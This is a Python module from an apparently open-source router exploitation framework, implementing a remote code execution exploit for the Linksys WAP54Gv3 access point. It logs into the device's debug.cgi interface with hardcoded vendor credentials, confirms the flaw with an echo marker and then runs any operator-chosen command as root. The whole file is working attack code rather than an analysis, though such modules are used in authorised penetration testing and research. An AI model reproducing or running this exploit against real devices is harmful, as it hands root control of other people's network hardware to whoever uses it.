# Name: Linksys WAP54Gv3 remote code execution
# File: wap54gv3_exec.py
# Author: Ján Trenčanský
# License: GNU GPL v3
# Created: 23.07.2016
# Last modified: 23.07.2016
# Shodan Dork:
# Description: Debug interface with hardcoded credentials allows to run commands with root privileges
# Based on: http://seclists.org/bugtraq/2010/Jun/93

import core.Exploit
import core.io

import requests
import re
import interface.utils
from interface.messages import print_error, print_success, print_help, print_info


class Exploit(core.Exploit.RextExploit):
    """
Name: Linksys WAP54Gv3 remote code execution
File: wap54gv3_exec.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 23.07.2016
Description: Debug interface with hardcoded credentials allows to run commands with root privileges
Based on: http://seclists.org/bugtraq/2010/Jun/93

Options:
    Name        Description

    host        Target host address
    port        Target port
    command     Command to execute e.g. cat var/passwd
    """
    command = ""

    def __init__(self):
        self.command = "pwd"
        core.Exploit.RextExploit.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        try:
            if args[0] == "host":
                if interface.utils.validate_ipv4(args[1]):
                    self.host = args[1]
                else:
                    print_error("please provide valid IPv4 address")
            elif args[0] == "port":
                if str.isdigit(args[1]):
                    self.port = args[1]
                else:
                    print_error("port value must be integer")
            elif args[0] == "command":
                self.command = ' '.join(args[1:])
        except IndexError:
            print_error("please specify value for variable")

    def do_command(self, e):
        print_info(self.command)

    def help_command(self):
        print_help("Prints current value of command")

    def do_run(self, e):
        url = "http://%s:%s/debug.cgi" % (self.host, self.port)
        data = {"data1": "echo 741852", "command": "ui_debug"}

        try:
            response = requests.post(url=url, data=data, auth=("Gemtek", "gemtekswd"), timeout=60)
            result = re.findall("<textarea rows=30 cols=100>\\n(.*)\\n</textarea>", response.text)
            if "741852" == result[0]:
                print_success("Target is vulnerable")
                data = {"data1": self.command, "command": "ui_debug"}
                response = requests.post(url=url, data=data, auth=("Gemtek", "gemtekswd"), timeout=60)
                result = re.findall("<textarea rows=30 cols=100>\\n(.*)\\n</textarea>", response.text)
                print(result[0])
            else:
                print_error("target is not vulnerable")
        except requests.Timeout:
            print_error("timeout")
        except requests.ConnectionError:
            print_error("exploit failed")
        except TypeError:
            print_error("Something went wrong in answer parsing")
Exploit()
